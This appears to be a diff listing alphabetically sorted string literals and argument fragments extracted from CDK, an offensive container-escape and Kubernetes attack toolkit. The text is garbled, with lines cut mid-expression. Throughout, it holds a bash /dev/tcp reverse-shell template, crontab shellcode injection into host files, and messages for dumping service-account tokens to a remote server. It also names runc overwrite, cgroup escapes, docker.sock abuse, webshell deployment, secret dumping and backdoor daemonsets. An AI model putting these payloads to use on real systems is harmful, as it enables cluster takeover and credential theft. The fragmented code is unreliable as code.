@@ -1,0 +1,1707 @@
+"( ""$OS"" == ""$tag_distro"" -a ""$(echo ""$DISTRO"" | grep -E ""$tag_distro_num"""
+"(""  ]\n"""
+"("""
+"("""", """", name"
+"("""", "".bin"""
+"("""", rhost, rport"
+"(""# CDK auto exploit via K8s backdoor daemonset"", ""/host-root/etc/crontab"", shellCommand"
+"(""# CDK auto exploit via mounted device in privileged container"", crontabDir, shellCommand"
+"(""#!/bin/bash \n %s"", hijackCommand"
+"(""%-80s\t%-10s\n"", ""----"", ""------"""
+"(""%-80s\t%-10s\n"", k, v"
+"(""%d"", ipExt"
+"(""%s %s"", ""CDK Version(GitCommit"
+"(""%s \t %s \t %s"", kv.ExploitType, kv.Name, kv.Desc"
+"(""%s read error, %v"", input, err"
+"(""%s%s"", prefix, format"
+"(""%s-%s"", ""cdk-var-log-escape"", util.RandString(10"
+"(""%s.%s.%s"", tIp[0], tIp[1], tIp[2]"
+"(""%s/devices.allow"", deviceCGroupPath"
+"(""%s: %s"", key, GreenBold.Sprint(value"
+"(""%s: %s"", key, value"
+"(""%s:%d"", ip, port"
+"(""%s:%d"", stat.Raddr.IP, stat.Raddr.Port"
+"(""%s:%s %s %s %s - %s %s %s"", mi.Major, mi.Minor, mi.Root, mi.MountPoint, optStr, mi.Fstype, mi.Device, superBlockOptionsStr"
+"(""%s:%s"", username, password"
+"(""%s://%s"", u.Scheme, u.Host"
+"(""%s:\n%s"", e.CustomMsg, e.Err"
+"(""%s\n"", out"
+"(""%s\n"", strings.Join(matched, ""\n"""
+"(""%s\n"", util.RedBold.Sprint(""Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`."""
+"(""%sv2/"", imageRegistryURL"
+"(""%v %v\n"", i.Name, a"
+"(""%v"", cli.Args[""<args>""].([]string"
+"(""%v"", err"
+"(""%v\n"", normalizeInput(""root"""
+"(""%v\t%v\t%v\t%v\n"", user, p.Pid, ppid, pexe"
+"(""(?i"
+"(""--etcd-keyfile=[^""]*?""[\s\S]*?"
+"(""."""
+"(""../../test"""
+"(""./%s ."", shellPath"
+"(""./cdk_mknod_result"", syscall.S_IFBLK|uint32(os.FileMode(0700"
+"(""./host_dev"", syscall.S_IFBLK|uint32(os.FileMode(0700"
+"(""/"""
+"(""/%s/%s/%s"", namespace, pod, container"
+"(""/api/v1/namespaces/%s/pods"", namespace"
+"(""/api/v1/namespaces/%s/pods/%s"", namespace, podName"
+"(""/bin/bash"", ""-c"", command"
+"(""/bin/csh"""
+"(""/bin/sh"""
+"(""/bin/sh"", ""-c"", ""sleep 2"""
+"(""/cdk_%s"", util.RandString(6"
+"(""/cdk_cgexp_%s.sh"", taskRandString"
+"(""/cdk_cgres_"" + taskRandString"
+"(""/host/etc/crontab"", shellCommand, ""# CDK auto exploit via docker.sock"""
+"(""/kubelet/|/dev/[\\w-]*?\\blog$|/etc/host[\\w]*?$|/etc/[\\w]*?\\.conf$"", m.Root"
+"(""/logs/"", randomeFilename"
+"(""/proc mounted dir:\n%s\n"", procDir"
+"(""/proc"""
+"(""/proc/"" + f.Name("
+"(""/proc/""+strconv.Itoa(found"
+"(""/proc/%s/cgroup"", pidStr"
+"(""/proc/1/cgroup error: %v\n"", err"
+"(""/proc/1/cgroup file content:"""
+"(""/proc/net/unix"""
+"(""/proc/self/cgroup error: %v\n"", err"
+"(""/proc/self/cgroup file added content (compare pid 1"
+"(""/proc/self/fd/""+strconv.Itoa(handleFd"
+"(""/proc/self/mounts"""
+"(""/proc/self/status"""
+"(""/proc/sys/kernel/randomize_va_space file content: %s"", string(data"
+"(""/proc/sys/kernel/unprivileged_userns_clone"""
+"(""/sys/fs/cgroup/cgroup.controllers"""
+"(""/sys/fs/cgroup/devices/devices.allow"""
+"(""/tmp/%s_%s"", filePreString, taskRandString"
+"(""/tmp/cdk_%s"", util.RandString(5"
+"(""/usr/bin/debugfs"""
+"(""/var/run/docker.sock"", crontabCMD"
+"(""0 %d 1"", os.Getegid("
+"(""0 %d 1"", os.Geteuid("
+"(""1,2,3-5"""
+"(""10.%d.%d.%d"", rand.Intn(256"
+"("">=v1.16"""
+"(""@/containerd-shim/.*\\.sock"""
+"(""ASLR is disabled."""
+"(""ASLR is enabled."""
+"(""Accept failed: %s"", err"
+"(""Account: %s:%s is available.\n"", username, password"
+"(""Attack the kubelet endpoint."""
+"(""Authorization"", ""Bearer ""+strings.TrimSuffix(sysToken, ""\n"""
+"(""Authorization"", ""Bearer ""+strings.TrimSuffix(token, ""\n"""
+"(""Authorization"", ""Bearer ""+token"
+"(""Authorization"", authorizationHeader"
+"(""Basic %s"", sEnc"
+"(""Blockdevice Marjor/Minor number invalid."""
+"(""Cannot find kube-apiserver pod in namespace:kube-system, maybe target K8s master node managed by cloud provider, cannot deploy api-server in this environment."""
+"(""Cannot find vulnerable containerd-shim socket."""
+"(""CapHexParser error parse %s: %s"", k, v"
+"(""CapHexParser error: %s"", err"
+"(""Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb"
+"(""Closed: %s"", conn.RemoteAddr("
+"(""Closed: %s"", dailAddr"
+"(""Connect to etcd and get token of k8s. """
+"(""Connection received : %s"", addr.String("
+"(""Connection received: %s"", conn.RemoteAddr("
+"(""Connection"", ""Upgrade"""
+"(""Content-Type"", ""application/json"""
+"(""Critical - Possible Privileged Container Found."""
+"(""Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'."""
+"(""Dail failed: %s"", err"
+"(""Dialed host: %s://%s"", network, dailAddr"
+"(""Discovery - Cloud Provider Metadata API"""
+"(""Discovery - K8s API Server"""
+"(""Discovery - K8s Service Account"""
+"(""Docker API response:"""
+"(""End!"""
+"(""Evaluate:"""
+"(""Example: cdk run etcd-get-k8s-token anonymous http://172.16.61.10:2379"""
+"(""Example: cdk run kubelet-exec exec https://172.16.61.10:10250/kube-system/test1/test \""ip addr\"""""
+"(""Example: cdk run kubelet-exec list http://172.16.61.10:10250"""
+"(""Execute Result: \n\n %s \n"", string(retRes"
+"(""Execute Shell:%s failed with error:%s"", cmd, err1.Error("
+"(""Execute Shell:%s failed"", command"
+"(""Execute Shell:%s finished with output:\n%s"", command, string(output"
+"(""Exited"""
+"(""Exploit CVE-2019-5736 with shellcode commands: "", cmd"
+"(""Exploit Pre - Kernel Exploits"""
+"(""Exploit container escape with kubelet log access & /var/log mount."""
+"(""Exploit:"""
+"(""Failed read: %s"", err"
+"(""Find mounted lxcfs with rw flags, run `%s` or `%s` to escape container!\n"", util.RedBold.Sprint(""cdk run lxcfs-rw"""
+"(""Finished."""
+"(""Found hostpath: "" + hostPath"
+"(""GET"", req_url, nil"
+"(""GET"", url, """""
+"(""GET"", url, nil"
+"(""GOTRACEBACK"""
+"(""GOTRACEBACK"", ""crash"""
+"(""If there is one argument, the first argument is the target file to read. """
+"(""Information Gathering - ASLR"""
+"(""Information Gathering - Cgroups"""
+"(""Information Gathering - Commands and Capabilities"""
+"(""Information Gathering - DNS-Based Service Discovery"""
+"(""Information Gathering - Mounts"""
+"(""Information Gathering - Net Namespace"""
+"(""Information Gathering - Sensitive Files"""
+"(""Information Gathering - Services"""
+"(""Information Gathering - Sysctl Variables"""
+"(""Information Gathering - System Info"""
+"(""Invalid Docker Remote API: "" + api"
+"(""Invalid IP Range (eg. 1.1.1.1-3"
+"(""Invalid Input Args."""
+"(""Invalid input args"""
+"(""Invalid input args. (subsystem OR cmd not quoted"
+"(""Invalid input args."""
+"(""K8S Pod Security Policies rule list:"""
+"(""KUBERNETES_SERVICE_HOST"""
+"(""KUBERNETES_SERVICE_PORT"""
+"(""Listen failed: %s"", err"
+"(""Listening on: %s://%s"", network, listenAddr"
+"(""No Pods were obtained."""
+"(""Notice to choose anonymous|default (need CA Cert"
+"(""POST"", url, """""
+"(""POST"", url, payloadData"
+"(""Read files from host or chroot to host and spawn a cmd. """
+"(""Request Body: "", opts.PostData"
+"(""Running with target: %v, ref: %v\n"", target, ref"
+"(""SYS_PTRACE capability was disabled."""
+"(""SYS_PTRACE capability was enabled."""
+"(""Sec-Websocket-Key"", ""cdktest"""
+"(""Sec-Websocket-Version"", ""13"""
+"(""Setuid files found:"", false"
+"(""Shellcode will be trigger when an execve("
+"(""Stdin stat failed: %s"", err"
+"(""Successfully got write handle"", writeHandle"
+"(""Support anonymous access or token designation."""
+"(""THIS EXPLOIT WILL OVERWRITE RUNC BINARY AND BREAK CI/CD, BACKUP YOUR RUNC BINARY FIRST!"""
+"(""TestBlankInString"", func(t *testing.T"
+"(""The First argument is file bind-mounted to container from host (default: %s"
+"(""The command executed is"", payload"
+"(""Token authentication failed!"""
+"(""Tool:"""
+"(""Trigger Release Error: %s \n"", err.Error("
+"(""Trying to create a pod to dump service-account:%s token to remote server %s:%s\n"", targetServiceAccount, rhost, rport"
+"(""Upgrade"", ""websocket"""
+"(""Upload cdk binary to K8s failed.\nCMD: "" + cmd"
+"(""Upload cdk binary to self-build k8s failed.\nCMD: "" + cmd"
+"(""Usage: ./cdk vi <file_name>\n"""
+"(""Usage: cdk run etcd-get-k8s-token (anonymous|default"
+"(""Usage: cdk run k8s-kubelet-var-log-escape /root/targetfile-to-read"""
+"(""Usage: cdk run kubelet-exec (list|exec"
+"(""Use local token:"", sysToken"
+"(""User-Defined Shell Payload: %s \n"", cmd"
+"(""When second argument is \""/\"", this exploit will spawn a cmd. """
+"(""Write PID to cgroup.procs failed: %s \n"", err.Error("
+"(""X-Envoy-Peer-Metadata is %s.\n"", result.Header.XEnvoyPeerMetadata"
+"(""X-Envoy-Peer-Metadata-Id is %s.\n"", result.Header.XEnvoyPeerMetadataId"
+"(""X-Forwarded-For"", randIpStr"
+"(""You may be able to access the localhost service of the current container node or other nodes."""
+"(""[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation."""
+"(""[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/."""
+"(""[*] Maybe you can exploit the Capabilities below:\n"""
+"(""[+] %s\n"", Tasks[name].Desc("
+"(""[+] Args: %v.\n"", cli.Args[""<args>""]"
+"(""[+] Checking kubelet endpoint: %s"", kubeletEndpoint"
+"(""[+] Found /var/log mount success, mount point: %s"", mount.MountPoint"
+"(""[+] Get log file success, file content: \n%s"", fileContent"
+"(""[+] Running exploit: %s.\n"", name"
+"(""[+] You can write the host file '%s' in file path: %s"", targetFile, filepath"
+"(""[+] kubelet log access success, url: %s, response length: %d"", kubeletEndpoint, len(respText"
+"(""[+] run ifconfig, using GetLocalAddresses("
+"(""[+] run netstat, using RunNestat("
+"(""[-] Chroot: %v\n"", err"
+"(""[-] Fchdir: %v\n"", err"
+"(""[-] Get log file error: %v"", err"
+"(""[-] GetGateway error: %v"", err"
+"(""[-] GetMountInfo error: %v"", err"
+"(""[-] Not found /var/log mount"""
+"(""[-] Open: %v\n"", err"
+"(""[-] OpenByHandleAt: %v\n"", err"
+"(""[-] Please provide a payload"""
+"(""[-] Run cmd: %s\n"", err"
+"(""[-] capability.CapHexParser: %v\n"", err"
+"(""[-] kubelet log access error: %v"", err"
+"(""[-] read file: %s\n"", content"
+"(""[A-Fa-f0-9]{64}"""
+"(""[etcd-get-k8s-token] There are %d pods in kube-system namespace."", len(pods"
+"(""[etcd-get-token] run failed:"", err.Error("
+"(""[test] ping -> pong\n"""
+"(""\n%-80s\t%-10s\n"", ""Link"", ""Status"""
+"(""\n%s\n* * * * * root %s"", header, shellcode"
+"(""\nClosed udp listen"""
+"(""\nInvalid script name: %s , available scripts:\n"", name"
+"(""\nOutput:\n"", string(raw[6:len(raw"
+"(""\nOutput:\n"", string(raw[8:len(raw"
+"(""\n[Auto Escape - Deploy K8s Backdoor Daemonset]\n"""
+"(""\n[Auto Escape - K8s API Server]\n"""
+"(""\n[Auto Escape - Privileged Container]\n"""
+"(""\n[Auto Escape - Shared Net Namespace]\n"""
+"(""\n[Auto Escape - docker.sock]\n"""
+"(""\n[Information Gathering - Cgroups]\n"""
+"(""\n[Information Gathering - SIDs]\n"""
+"(""\n[test] run success\n"""
+"(""\nfound %s in: %s\n%s\n"", k, path, matched"
+"(""\t"" + ans"
+"(""\t"" + body"
+"(""\t%s - %s\n"", name, path"
+"(""\t%s Metadata API available in %s\n"", apiInstance.CloudProvider, apiInstance.API"
+"(""\t%s webshell saved in %s\n\tsend codes or system command via post param: %s=(codes"
+"(""\t%s\n"", line"
+"(""\t%s\n"", v.OriginalInfo"
+"(""\tAdded capability list: %s\n"", capability.CapListToString(addCaps"
+"(""\tCap decode: 0x%s = %s\n"", capStr, capability.CapListToString(caps"
+"(""\tDocs: %s\n"", apiInstance.DocURL"
+"(""\tFind K8s api-server in ENV:"", addr"
+"(""\tapi-server forbids anonymous request."""
+"(""\tcannot find RunC process inside container, exit."""
+"(""\tcongrats, api-server allows anonymous request."""
+"(""\tcontainer net namespace isolated."""
+"(""\tfailed"""
+"(""\tfailed."""
+"(""\tfound containerd-shim socket in: %s\n"", matched"
+"(""\thost unix-socket found, seems container started with --net=host privilege."""
+"(""\tlistening port: https://%s:9444\n"", node"
+"(""\tmatched pid - "", f.Name("
+"(""\tnow you can make your own request to takeover the entire k8s cluster with `./cdk kcurl` command\n\tgood luck and have fun."""
+"(""\tresponse:"" + resp"
+"(""\trun: kubectl --server=https://%s:9444 --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n"", node"
+"(""\trun: kubectl --server=https://%s:9444 --token=%s --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n"", node, token"
+"(""\tservice-account is available"""
+"(""\tservice-account is not available"""
+"(""\tshadow api-server pod name:%s, namespace:%s, node name:%s\n"", podName, namespace, node"
+"(""\tsuccess, the service-account have a high authority."""
+"(""\tsuccess, the system:anonymous role have a high authority."""
+"(""abuse-unpriv-userns"", exploit"
+"(""ak-leakage"", exploit"
+"(""all exploits are finished, auto exploit failed."""
+"(""all exploits are finished, auto exploit success!"""
+"(""all"""
+"(""api-server response in deployPod:"""
+"(""api-server response in dumpPodConfig:"""
+"(""api-server response:"""
+"(""authorize success"""
+"(""auto-escape"""
+"(""auto-escape"", task"
+"(""available commands:\n\t%s\n"", strings.Join(ans, "","""
+"(""base64 decode failed:"", err.Error("
+"(""bash -i >& /dev/tcp/%s/%s 0>&1"", rhost, rport"
+"(""bash"""
+"(""bash"", ""-c"", script"
+"(""can not find host path\n"""
+"(""cannot create subgroup :%s"", err"
+"(""cannot decode JSON: %v"", err"
+"(""cannot enable notify_on_release %s"", err"
+"(""cannot fetch http://httpbin.org/get , get err: %v"", err"
+"(""cannot get docker daemon info from target unix socket."""
+"(""cannot run `fdisk` command on target os"""
+"(""cap-dac-read-search"", exploit"
+"(""cdk run lxcfs-rw-cgroup"""
+"(""cdk_dcgroup"""
+"(""cgroup"", mountPointPath, ""cgroup"", 0, subSystemName"
+"(""check cdk banner in .go"""
+"(""check cdk banner in github wiki"""
+"(""check cdk banner in readme.md"""
+"(""check cdk version"""
+"(""check run ok, timeout in 2s, and return."""
+"(""check-ptrace"", exploit"
+"(""checking docker socket: "", sock"
+"(""checking docker socket:"", sock"
+"(""checking if api-server allows system:anonymous request."""
+"(""client.Do error: %v\n"", err"
+"(""cmd.exe"""
+"(""container ID: "", params"
+"(""convert major number to int64 err: %v\n"", err"
+"(""convert minor number to int64 err: %v\n"", err"
+"(""current cgroup for exploit: %s \n"", subSysName"
+"(""current dir:"", dir"
+"(""current docker abs path:\n%s\n"", dockerPath"
+"(""current user:"", u.Username, ""uid:"", u.Uid, ""gid:"", u.Gid, ""home:"", u.HomeDir"
+"(""deny"""
+"(""devices.allow content: %s"", devicesAllow"
+"(""docker-api-pwn"", exploit"
+"(""docker-sock-check"", exploit"
+"(""docker-sock-pwn"", exploit"
+"(""docopt err: "", err"
+"(""dump Pod Security Policies success, saved in: "", outFile"
+"(""dump config json of pod:"", podName, ""in namespace:"", namespace"
+"(""dump configmap success, saved in: "", outFile"
+"(""dump secret success, saved in: "", outFile"
+"(""echo \""\n%s\n* * * * * root %s\"" >> %s"", header, shellcmd, crontab"
+"(""ending; @args is ips: %v, max parallels:%v, timeout:%v\n"", ps.ipRange, conf.TCPScannerConf.MaxParallel, ps.timeout"
+"(""env GOTRACEBACK not found, trying to set GOTRACEBACK=crash then reload exploit."""
+"(""err found in post request, error response code: %v."", resp.Status"
+"(""err found when parse input arg <parallel>"""
+"(""err found when parse input arg <timeout-ms>"""
+"(""err found when reading /proc dir:"", err"
+"(""err found while open %s: %v\n"", RouteLocalNetProcPath, err"
+"(""err found while open"", p"
+"(""error found when gene ip list to scan task"""
+"(""error stdout: %s"", cmd.Stdout"
+"(""error when requesting coreDNS: %s\n"", err.Error("
+"(""etcd-get-k8s-token"", exploit"
+"(""example: cdk probe 192.168.1.0-255 22,80,100-110 50 1000"""
+"(""example: cdk run mount-procfs /mnt/host_proc \""touch /tmp/exploit_success\"" (the shell payload will run by docker host"
+"(""executing command(%s"
+"(""exploit failed"""
+"(""exploit failed."""
+"(""exploit mount-disk failed."""
+"(""exploit success"""
+"(""exploit success, run \""debugfs -w host_dev\""."""
+"(""exploit success, shellcodes wrote to: "", crontabDir"
+"(""exploit success."""
+"(""eyJh[\\w\\.-]+"""
+"(""fail to connect remote addr: "", connectString"
+"(""fail to create mount dir in:%s"", mountDir"
+"(""faild to request api-server."""
+"(""failed to dial %s API."", apiInstance.CloudProvider"
+"(""failed to find docker abs path in /proc/self/mounts"""
+"(""failed to find docker devicemapper abs path in /proc/self/mounts"""
+"(""failed to get api-server response"""
+"(""failed to get container ID after created."""
+"(""failed to get server version: %v"", err"
+"(""failed to write file."", err"
+"(""failed, 403 Forbidden, api-server response:"""
+"(""failed, api-server response:"""
+"(""fdisk"""
+"(""fdisk"", ""-l"""
+"(""field gitVersion not found in response"""
+"(""filter string for mount point is \""%s\"""", filterString"
+"(""final shell exploit is: \n\n"""
+"(""find api-server pod:"""
+"(""find cgroup devices.allow file: %s\n"", devicesAllowPath"
+"(""find release agent path %s"", releaseAgentPath"
+"(""find release agent subsystem error"""
+"(""finished."""
+"(""found """
+"(""found host blockDeviceId Major: %s Minor: %s\n"", mi.Major, mi.Minor"
+"(""found invalid mountinfo line in file %s: %s "", mountInfoPath, r"
+"(""found pod devices.allow path: %s\n"", mi.Root"
+"(""found rw lxcfs mountpoint: %s\n"", mi.MountPoint"
+"(""found"", len(devices"
+"(""generate cgroup dir: %s\n"", deviceCGroupPath"
+"(""generate cronjob with \n image:%s\n cmd:%s\n schedule:%s\n"", image, inputArgs, schedule"
+"(""generate shell exploit with user-input cmd: \n\n%s\n\n"", cmd"
+"(""get /sys/fs/cgroup/devices/devices.allow inode error: %s\n"", err"
+"(""get /sys/fs/cgroup/devices/devices.allow inode id: %d\n"", inodeID"
+"(""get mount info error: %v"", err"
+"(""get process list failed."""
+"(""get"", path, ""http://127.0.0.1/info"", """""
+"(""getting K8s api-server API addr."""
+"(""happy escaping!"""
+"(""hostname:"", hostname"
+"(""http.NewRequest error: %v\n"", err"
+"(""http://httpbin.org/get"""
+"(""https://%s:10250/"", gateway"
+"(""if debugfs can not used, may be you can try to run `./cdk run lxcfs-rw-cgroup 'shell-cmd-payloads`"""
+"(""if you see \""(core dumped"
+"(""invalid /proc dir path:"", args[0]"
+"(""invalid input args, Example: ./cdk dcurl get http://127.0.0.1:2375/info \""\"""""
+"(""invalid input args, Example: ./cdk ucurl get /var/run/docker.sock http://127.0.0.1/info \""\"""""
+"(""invalid input args. Usage: cdk run deploy-webshell (php|jsp"
+"(""invalid input args."""
+"(""invalid response data, possible caused by api-server forbidden this request."""
+"(""invalid reverse shell remote addr: "", connectString"
+"(""invalid to list pods, possible caused by api-server forbidden this request."""
+"(""ipType\t\tconnection\tlocalAddr\t\t\tstatus\t\t\tremoteAddr\t\t\tpid\n"""
+"(""ipv4\t\ttcp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port"
+"(""ipv4\t\tudp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port"
+"(""ipv6\t\ttcp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port"
+"(""ipv6\t\tudp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port"
+"(""istio-check"", exploit"
+"(""k8s-backdoor-daemonset"", exploit"
+"(""k8s-configmap-dump"", exploit"
+"(""k8s-cronjob"", exploit"
+"(""k8s-get-sa-token"", exploit"
+"(""k8s-kubelet-var-log-escape"", exploit"
+"(""k8s-mitm-clusterip"", exploit"
+"(""k8s-psp-dump"", exploit"
+"(""k8s-secret-dump"", exploit"
+"(""k8s-shadow-apiserver"", exploit"
+"(""kubelet-exec"", exploit"
+"(""log list: \n%s"", loglistText"
+"(""lxcfs-rw"", exploit"
+"(""lxcfs-rw-cgroup"", exploit"
+"(""metadata.name"""
+"(""metadata.namespace"""
+"(""mknod err: %v"", err"
+"(""mount"", ""-t"", ""cgroup"", ""-o"", ""devices"", ""devices"", deviceCGroupPath"
+"(""mount"", device, mountDir"
+"(""mount-cgroup"", exploit"
+"(""mount-disk"", exploit"
+"(""mount-procfs"", exploit"
+"(""name"""
+"(""net.ipv4.conf.all.route_localnet = %s"", string(data"
+"(""no default gateway found"""
+"(""no dir in the %s"", releaseAgentPath"
+"(""not privileged container."""
+"(""now, run 'debugfs -w cdk_mknod_result' to browse host files."""
+"(""open %s: %s:%d\n"", p.Desc, ip, port"
+"(""open devices.allow failed. %v\n"", err"
+"(""open devices.list failed. %v\n"", err"
+"(""overwrite file:"", path, ""err: ""+err.Error("
+"(""overwrite file:"", path, ""success."""
+"(""password dict length: %d.\n"", len(passwordList"
+"(""post"", path, ""http://127.0.0.1/containers/""+containerID+""/start"", """""
+"(""post"", path, ""http://127.0.0.1/containers/create"", payloadData"
+"(""post"", path, ""http://127.0.0.1/images/create?fromImage=""+strings.Replace(image, "":"", ""&tag="", -1"
+"(""ps.Processes("
+"(""read devices.list failed. %v\n"", err"
+"(""read execution result file error %s"", err"
+"(""recover from panic:"", r"
+"(""refer"", ""https://github.com/mzet-/linux-exploit-suggester"", false"
+"(""registry-brute"", exploit"
+"(""release_agent is not writable %s"", err"
+"(""request apiserver uri `%s` error: %v, response: %s"", opts.Api, err, resp"
+"(""request data:"",data"
+"(""requesting "", configmapApi"
+"(""requesting "", cronJobAPI"
+"(""requesting "", defaultPodApi"
+"(""requesting "", pspApi"
+"(""requesting "", secretApi"
+"(""respone error: %s"", string(bodyBytes"
+"(""response data:"", resp"
+"(""response:"""
+"(""response_data:"",resp"
+"(""reverse-shell"", exploit"
+"(""rewrite-cgroup-devices"", exploit"
+"(""rule { %s: %s } is not allowed."", match[1], match[2]"
+"(""run command error :"" + e.Error("
+"(""run mount -t cgroup -o devices devices /tmp/cdk_dcgroup** error: %s\n"", err"
+"(""runc-pwn"", exploit"
+"(""scanning %v with user-defined ports, max parallels:%v, timeout:%v\n"", ps.ipRange, parallel, ps.timeout"
+"(""scanning use time:%vms\n"", useTime"
+"(""searching secrets in "", path"
+"(""sensitive env found:\n\t%s"", env"
+"(""service found in process:\n\t%d\t%d\t%s\n"", proc.Pid("
+"(""service-probe"", exploit"
+"(""set %s\n"", devicesAllowPath"
+"(""set GOTRACEBACK env failed:"", err"
+"(""set all block device accessible success.\n"""
+"(""set block accessible err %v"", err"
+"(""shadow api-server deploy success!"""
+"(""shell payload:\n%s\n"", shellPayload"
+"(""shell script saved to %s"", outFile"
+"(""shim pid:"", info.Pid"
+"(""shim-pwn"", exploit"
+"(""skip ln:"", path"
+"(""skip"", currentPath"
+"(""spec.containers"""
+"(""starting container:"", containerID"
+"(""starting to deploy exploit"""
+"(""status.phase"""
+"(""success! device %s was mounted to %s\n\n"", device, mountDir"
+"(""success, docker.sock is available. please use `./cdk ucurl` commands to control docker API"""
+"(""tcp"", connectString"
+"(""tcp"", target, timeout"
+"(""test-poc"", exploit"
+"(""the second argument specifies which file to read (default: %s"
+"(""the shell is in a istio(service mesh"
+"(""the shell is not in a istio(service mesh"
+"(""the target dir is %s"", targetDir"
+"(""the third and remaining arguments specifies command executed in host root filesystem (default: %s"
+"(""trigger segment fault to finish exploit, pls check if payload executed success after this program quit."""
+"(""try socket:"", sockname"
+"(""trying to create man in the middle ExternalIPs svc ip: %s and port: %s"", targetIP, targetPort"
+"(""trying to create man in the middle deploy containers with image:%s and port:%s"", image, targetPort"
+"(""trying to deploy daemonset with image:%s to k8s-app:%s"", image, k8sApp"
+"(""trying to dump K8s Pod Security Policies with local service-account:"", args[0]"
+"(""trying to dump K8s Pod Security Policies with local service-account:"", conf.K8sSATokenDefaultPath"
+"(""trying to dump K8s Pod Security Policies with user system:anonymous"""
+"(""trying to dump K8s Secrets with local service-account:"", args[0]"
+"(""trying to dump K8s Secrets with local service-account:"", conf.K8sSATokenDefaultPath"
+"(""trying to dump K8s Secrets with user system:anonymous"""
+"(""trying to dump K8s configmap with local service-account:"", args[0]"
+"(""trying to dump K8s configmap with local service-account:"", conf.K8sSATokenDefaultPath"
+"(""trying to dump K8s configmap with user system:anonymous"""
+"(""trying to find api-server pod in namespace:kube-system"""
+"(""trying to list namespaces"""
+"(""trying to pull image:"", image"
+"(""trying to run shell cmd: %s\n"", shellCmd"
+"(""trying to spawn shell to %s:%s\n"", rhost, rport"
+"(""trying to write crontab to: "", crontabDir"
+"(""ulimit"", ""-n"""
+"(""uname -s"", hide=True"
+"(""unix"", ""\x00""+sock"
+"(""unix"", unixPath"
+"(""unknown internal error when executing uname"""
+"(""usage: cdk probe <ip> <port> <parallels> <timeout-ms>"""
+"(""usage: cdk run mount-procfs <dir> \""<shell-payload>\"""""
+"(""user dict length: %d.\n"", len(usernameList"
+"(""user-defined shell payload is: %s \n"", cmd"
+"(""value"""
+"(""webshell-deploy"", exploit"
+"(""write \""a\"" to devices.allow failed.\n"""
+"(""write devices.allow failed. %v\n"", err"
+"(""write shell exploit failed\n"""
+"(""writeable cgroup devices.allow not found"""
+"(""you can find Docker APIs in https://docs.docker.com/engine/api/v1.24/"""
+"(""you can try another way to exploit, recommend: `./cdk run lxcfs-rw"""
+"(""{\""key\"": \""%s\""}"", b64key"
+"(""{\""range_end\"": \""%s\"", \""key\"": \""%s\"", \""keys_only\"":true}"", bzero, b64key"
+"(""|%s/cmd_%s"", dockerPath, randKey"
+"($(sort -r <<<""${exploits_to_sort[*]}"""
+"(&config.Command, ""e"", false, ""shell mode"""
+"(&config.Help, ""help"", false, ""print this help"""
+"(&config.Host, ""h"", ""0.0.0.0"", ""host addr to connect or listen"""
+"(&config.Listen, ""l"", false, ""listen mode"""
+"(&config.Network, ""n"", ""tcp"", ""network protocol"""
+"(&config.Port, ""p"", 4000, ""host port to connect or listen"""
+"(&config.Verbose, ""v"", false, ""verbose mode"""
+"(&mi, """""
+"(&mi, filterString"
+"('-' * 10, 'build CDK binary', '-' * 10"
+"('-' * 10, 'upload CDK to ECS, ACK, Selfbuild-K8s', '-' * 10"
+"('-' * 10, 'upload all done', '-' * 10"
+"('ECS', cmd_parsed, pattern, 'black'"
+"('ECS', cmd_parsed, pattern, 'white'"
+"('K8s Pod', cmd_parsed, pattern, 'black'"
+"('K8s Pod', cmd_parsed, pattern, 'white'"
+"('Selfbuild K8s Master Node', cmd_parsed, pattern, 'black'"
+"('Selfbuild K8s Master Node', cmd_parsed, pattern, 'white'"
+"('[ERROR] {} while running cmd: {}\nexcepted {} pattern:\n{}'.format(env, cmd, type, pattern"
+"('[Local]', CDK.BUILD_CMD"
+"('[TEST] [{}] {}'.format('ECS', cmd_parsed"
+"('[TEST] [{}] {}'.format('K8s Pod', cmd_parsed"
+"('[TEST] [{}] {}'.format('Selfbuild K8s Pod', cmd_parsed"
+"('[TEST] [{}] {}'.format('Selfbuild k8s master node', cmd_parsed"
+"('[TEST] [{}] {}'.format(image, cmd_parsed"
+"('\n', ''"
+"('evaluate --full', white_list, black_list"
+"('evaluate', white_list, ['i@cdxy.me', 'input args'], False"
+"('ls /tmp/docker-api-pwn', ['docker-api-pwn'], [], False"
+"('ls /tmp/docker-sock-pwn', ['docker-sock-pwn'], [], False"
+"('rm /tmp/mount-cgroup-success', [], ['No such file or directory'], False"
+"('rm /tmp/mount-procfs-success', [], ['No such file or directory'], False"
+"('rm /tmp/shim-pwn-success', [], ['No such file or directory'], False"
+"('stderr\n', stderr"
+"('stdout\n', stdout"
+"((""parse cdk main failed, name: %s, args: %v, buf: %s"""
+"((""parse cdk main failed, name: %s, args: %v, buf: %s, out: %s"""
+"() ([]CgroupInfo, error"
+"() ([]FromTo, int"
+"() ([]MountInfo, error"
+"() ([][]byte, error"
+"() ([]int, error"
+"() ([]string, error"
+"() (error, []string"
+"() (int, error"
+"() (string, error"
+"() + ""-shadow"" + ""-"" + strings.ToLower(util.RandString(6"
+"()+""shadow"""
+"(), ""x"""
+"(), proc.Executable("
+"().exec(request.getParameter(\""$SECRET_PARAM\"""
+"().format(CDK.BUILD_PATH,version"
+"()[:1000], string(out"
+"(,\s*?""[\s\S]*?"
+"(--audit-log-[^""]*?"
+"(/sbin/sysctl -a 2> /dev/null | grep ""$entry"" | awk -F'=' '{print $2}'"
+"(/usr/bin/equery --quiet list '*' -F '$name:$version' | cut -d/ -f2- | awk '{print $1"":""$2}'"
+"(0, io.SeekEnd"
